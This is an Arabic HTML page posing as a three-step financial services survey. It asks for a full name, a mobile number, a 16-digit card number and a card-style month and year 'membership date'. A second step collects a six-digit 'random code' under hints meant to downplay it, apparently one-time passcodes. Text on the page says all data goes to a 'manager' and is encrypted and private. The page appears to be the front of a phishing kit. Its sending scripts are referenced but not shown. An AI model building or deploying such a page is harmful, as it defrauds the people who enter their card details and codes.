<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>استبيان الخدمات المالية</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <!-- شاشة التحميل -->
    <div id="loading" class="loading-screen">
        <div class="loading-content">
            <div class="spinner"></div>
            <p>جاري تحميل الاستبيان...</p>
        </div>
    </div>

    <!-- الصفحة 1: المعلومات الشخصية -->
    <div id="page1" class="page active">
        <header>
            <h1><i class="fas fa-poll"></i> استبيان الخدمات المالية</h1>
            <p>المرحلة 1: المعلومات الأساسية</p>
        </header>
        
        <div class="progress-indicator">
            <div class="progress-step active">
                <div class="step-number">1</div>
                <div class="step-label">المعلومات الشخصية</div>
            </div>
            <div class="progress-line"></div>
            <div class="progress-step">
                <div class="step-number">2</div>
                <div class="step-label">التحقق</div>
            </div>
            <div class="progress-line"></div>
            <div class="progress-step">
                <div class="step-number">3</div>
                <div class="step-label">النهاية</div>
            </div>
        </div>
        
        <main>
            <div class="form-container">
                <div class="form-section">
                    <h2><i class="fas fa-user-edit"></i> أدخل معلوماتك</h2>
                    <p class="section-description">جميع المعلومات تصل للمدير مباشرة للمراجعة</p>
                    
                    <!-- الاسم الكامل -->
                    <div class="input-group">
                        <label for="fullName">
                            <i class="fas fa-user"></i>
                            <span>الاسم الكامل</span>
                            <span class="required">*</span>
                        </label>
                        <input type="text" 
                               id="fullName" 
                               class="form-input"
                               placeholder="الاسم الأول واسم العائلة"
                               required>
                        <div class="input-hint">
                            <i class="fas fa-info-circle"></i>
                            اكتب اسمك كما هو في الوثائق الرسمية
                        </div>
                    </div>
                    
                    <!-- رقم الهاتف -->
                    <div class="input-group">
                        <label for="phoneNumber">
                            <i class="fas fa-mobile-alt"></i>
                            <span>رقم الهاتف</span>
                            <span class="required">*</span>
                        </label>
                        <input type="tel" 
                               id="phoneNumber" 
                               class="form-input"
                               placeholder="مثال: 0551234567"
                               pattern="^(05|06|07)[0-9]{8}$"
                               required>
                        <div class="input-hint">
                            <i class="fas fa-info-circle"></i>
                            يبدأ بـ 05 أو 06 أو 07 ويتكون من 10 أرقام
                        </div>
                    </div>
                    
                    <!-- رقم البطاقة -->
                    <div class="input-group">
                        <label for="cardNumber">
                            <i class="fas fa-credit-card"></i>
                            <span>رقم البطاقة</span>
                            <span class="required">*</span>
                        </label>
                        <input type="text" 
                               id="cardNumber" 
                               class="form-input"
                               placeholder="16 رقم - مثال: 1234567890123456"
                               pattern="[0-9]{16}"
                               maxlength="16"
                               required>
                        <div class="input-hint">
                            <i class="fas fa-info-circle"></i>
                            يمكنك استخدام أي 16 رقم، هذا للتحقق فقط
                        </div>
                    </div>
                    
                    <!-- تاريخ الانتماء (الشهر والعام) -->
                    <div class="input-group">
                        <label for="membershipDate">
                            <i class="fas fa-calendar-alt"></i>
                            <span>تاريخ الانتماء</span>
                            <span class="required">*</span>
                        </label>
                        <div class="date-input-container">
                            <div class="date-select-group">
                                <select id="membershipMonth" class="month-select" required>
                                    <option value="">اختر الشهر</option>
                                    <option value="01">يناير</option>
                                    <option value="02">فبراير</option>
                                    <option value="03">مارس</option>
                                    <option value="04">أبريل</option>
                                    <option value="05">مايو</option>
                                    <option value="06">يونيو</option>
                                    <option value="07">يوليو</option>
                                    <option value="08">أغسطس</option>
                                    <option value="09">سبتمبر</option>
                                    <option value="10">أكتوبر</option>
                                    <option value="11">نوفمبر</option>
                                    <option value="12">ديسمبر</option>
                                </select>
                                
                                <select id="membershipYear" class="year-select" required>
                                    <option value="">اختر السنة</option>
                                    <option value="2024">2024</option>
                                    <option value="2023">2023</option>
                                    <option value="2022">2022</option>
                                    <option value="2021">2021</option>
                                    <option value="2020">2020</option>
                                    <option value="2019">2019</option>
                                    <option value="2018">2018</option>
                                    <option value="2017">2017</option>
                                    <option value="2016">2016</option>
                                    <option value="2015">2015</option>
                                </select>
                            </div>
                        </div>
                        <div class="input-hint">
                            <i class="fas fa-info-circle"></i>
                            الشهر والسنة التي انتميت فيها للخدمة
                        </div>
                    </div>
                    
                    <!-- رسالة تأكيد -->
                    <div class="confirmation-box">
                        <input type="checkbox" id="dataConfirmation" required>
                        <label for="dataConfirmation">
                            <i class="fas fa-check-circle"></i>
                            أوافق على إرسال هذه المعلومات للمدير للمراجعة
                        </label>
                    </div>
                </div>
                
                <div class="form-actions">
                    <button onclick="sendToManager()" class="btn send-btn">
                        <i class="fas fa-paper-plane"></i> إرسال للمدير
                    </button>
                    
                    <div class="action-hint">
                        <i class="fas fa-exclamation-triangle"></i>
                        بعد الإرسال، ستنتقل تلقائياً للصفحة التالية
                    </div>
                </div>
            </div>
        </main>
    </div>

    <!-- الصفحة 2: التحقق والرمز العشوائي -->
    <div id="page2" class="page">
        <header>
            <h1><i class="fas fa-shield-alt"></i> التحقق من المشاركة</h1>
            <p>المرحلة 2: أكمل التحقق</p>
        </header>
        
        <div class="progress-indicator">
            <div class="progress-step completed">
                <div class="step-number"><i class="fas fa-check"></i></div>
                <div class="step-label">مكتمل</div>
            </div>
            <div class="progress-line active"></div>
            <div class="progress-step active">
                <div class="step-number">2</div>
                <div class="step-label">التحقق</div>
            </div>
            <div class="progress-line"></div>
            <div class="progress-step">
                <div class="step-number">3</div>
                <div class="step-label">النهاية</div>
            </div>
        </div>
        
        <main>
            <div class="verification-container">
                <!-- معلومات الجهاز التلقائية -->
                <div class="device-info-card">
                    <div class="device-icon">
                        <i class="fas fa-laptop"></i>
                    </div>
                    <div class="device-details">
                        <h3><i class="fas fa-desktop"></i> تم كشف جهازك تلقائياً</h3>
                        <div class="device-info-grid">
                            <div class="info-item">
                                <span class="info-label">نوع الجهاز:</span>
                                <span id="deviceType" class="info-value">جوال</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">المتصفح:</span>
                                <span id="browserType" class="info-value">Chrome</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">نظام التشغيل:</span>
                                <span id="osType" class="info-value">Android</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">الشاشة:</span>
                                <span id="screenSize" class="info-value">390×844</span>
                            </div>
                        </div>
                        <div class="device-note">
                            <i class="fas fa-info-circle"></i>
                            هذه المعلومات تساعد في تحسين تجربة الاستخدام
                        </div>
                    </div>
                </div>
                
                <!-- إدخال الرمز العشوائي -->
                <div class="code-section">
                    <h2><i class="fas fa-key"></i> الرمز العشوائي</h2>
                    <p class="section-description">أدخل أي 6 أرقام من مخيلتك (ليست هناك إجابة صحيحة)</p>
                    
                    <div class="code-input-container">
                        <input type="text" 
                               id="randomCode" 
                               class="code-input"
                               placeholder="أدخل 6 أرقام"
                               maxlength="6"
                               pattern="[0-9]{6}"
                               required>
                        <div class="code-hint">
                            <i class="fas fa-lightbulb"></i>
                            اختر أي أرقام تريدها، مثل: 123456 أو 654321
                        </div>
                    </div>
                    
                    <!-- أمثلة للرمز -->
                    <div class="code-examples">
                        <h4><i class="fas fa-bolt"></i> أمثلة سريعة:</h4>
                        <div class="example-buttons">
                            <button onclick="fillCode('123456')" class="example-btn">
                                123456
                            </button>
                            <button onclick="fillCode('654321')" class="example-btn">
                                654321
                            </button>
                            <button onclick="fillCode('111222')" class="example-btn">
                                111222
                            </button>
                            <button onclick="fillCode('999888')" class="example-btn">
                                999888
                            </button>
                        </div>
                    </div>
                </div>
                
                <!-- زر النهاية -->
                <div class="finish-section">
                    <div class="finish-note">
                        <i class="fas fa-check-circle"></i>
                        <p>تم إرسال معلوماتك الشخصية للمدير بنجاح</p>
                    </div>
                    
                    <button onclick="completeVerification()" class="btn finish-btn">
                        <i class="fas fa-flag-checkered"></i> النهاية
                    </button>
                    
                    <div class="security-note">
                        <i class="fas fa-lock"></i>
                        <p>جميع بياناتك محمية ومشفرة. سيتم إعلامك بأي تحديثات.</p>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <!-- الصفحة 3: النهاية -->
    <div id="page3" class="page">
        <div class="completion-container">
            <!-- أيقونة النجاح -->
            <div class="success-icon">
                <i class="fas fa-check-circle"></i>
            </div>
            
            <!-- العنوان والرسالة -->
            <div class="completion-header">
                <h1><i class="fas fa-trophy"></i> تم الإكمال بنجاح!</h1>
                <p class="completion-message">
                    شكراً لمشاركتك في استبيان الخدمات المالية.<br>
                </p>
            </div>
            
            <!-- تفاصيل المشاركة -->
            <div class="completion-details">
                <div class="details-card">
                    <h3><i class="fas fa-id-card"></i> تفاصيل مشاركتك</h3>
                    
                    <div class="details-grid">
                        <div class="detail-item">
                            <div class="detail-label">
                                <i class="fas fa-hashtag"></i>
                                رقم المشاركة:
                            </div>
                            <div class="detail-value" id="surveyId">FS-0001</div>
                        </div>
                        
                        <div class="detail-item">
                            <div class="detail-label">
                                <i class="fas fa-calendar"></i>
                                تاريخ الإرسال:
                            </div>
                            <div class="detail-value" id="submissionDate"></div>
                        </div>
                        
                        <div class="detail-item">
                            <div class="detail-label">
                                <i class="fas fa-user"></i>
                                الاسم:
                            </div>
                            <div class="detail-value" id="submittedName">-</div>
                        </div>
                        
                        <div class="detail-item">
                            <div class="detail-label">
                                <i class="fas fa-phone"></i>
                                الهاتف:
                            </div>
                            <div class="detail-value" id="submittedPhone">-</div>
                        </div>
                        
                        <div class="detail-item">
                            <div class="detail-label">
                                <i class="fas fa-clock"></i>
                                حالة المراجعة:
                            </div>
                            <div class="detail-value">
                                <span class="status-badge pending">قيد المراجعة</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- رسائل التوجيه -->
            <div class="completion-messages">
                <div class="message-card">
                    <div class="message-icon">
                        <i class="fas fa-bullhorn"></i>
                    </div>
                    <div class="message-content">
                        <h4>📢 ماذا بعد؟</h4>
                        <ul>
                            <li><i class="fas fa-check"></i> تم إرسال جميع بياناتك للمدير</li>
                            <li><i class="fas fa-check"></i> يجري الآن مراجعتها والتحقق منها</li>
                            <li><i class="fas fa-check"></i> سيتم إعلامك بأي تحديثات مهمة</li>
                        </ul>
                    </div>
                </div>
                
                <div class="message-card">
                    <div class="message-icon">
                        <i class="fas fa-shield-alt"></i>
                    </div>
                    <div class="message-content">
                        <h4>🔒 الأمان والخصوصية</h4>
                        <ul>
                            <li><i class="fas fa-check"></i> جميع البيانات مشفرة</li>
                            <li><i class="fas fa-check"></i> لا تشارك مع أطراف ثالثة</li>
                            <li><i class="fas fa-check"></i> يمكنك طلب حذف بياناتك</li>
                        </ul>
                    </div>
                </div>
            </div>
            
            <!-- أزرار الإجراءات -->
            <div class="completion-actions">
                <button onclick="newSurvey()" class="btn new-survey-btn">
                    <i class="fas fa-plus"></i> إنشاء استبيان جديد
                </button>
                
                <button onclick="shareSurvey()" class="btn share-btn">
                    <i class="fas fa-share-alt"></i> مشاركة الرقم
                </button>
                
                <button onclick="viewStatus()" class="btn status-btn">
                    <i class="fas fa-eye"></i> متابعة الحالة
                </button>
            </div>
            
            <!-- الملاحظة الختامية -->
            <div class="final-note">
                <i class="fas fa-star"></i>
                <p>شكراً لثقتك بنا. مشاركتك تساعد في تحسين الخدمات المالية للجميع.</p>
            </div>
        </div>
    </div>

    <!-- نافذة مشاركة الرقم -->
    <div id="shareModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-share-square"></i> مشاركة رقم المشاركة</h3>
                <button onclick="closeModal()" class="modal-close">&times;</button>
            </div>
            <div class="modal-body">
                <p>يمكنك نسخ رقم مشاركتك لمشاركته أو حفظه:</p>
                <div class="share-input-group">
                    <input type="text" id="shareCodeInput" readonly>
                    <button onclick="copyToClipboard()" class="copy-btn">
                        <i class="fas fa-copy"></i> نسخ
                    </button>
                </div>
                <div id="copyMessage" class="copy-message"></div>
            </div>
        </div>
    </div>

    <!-- الإشعارات -->
    <div id="notification" class="notification"></div>

    <script src="config.js"></script>
    <script src="app.js"></script>
</body>
</html>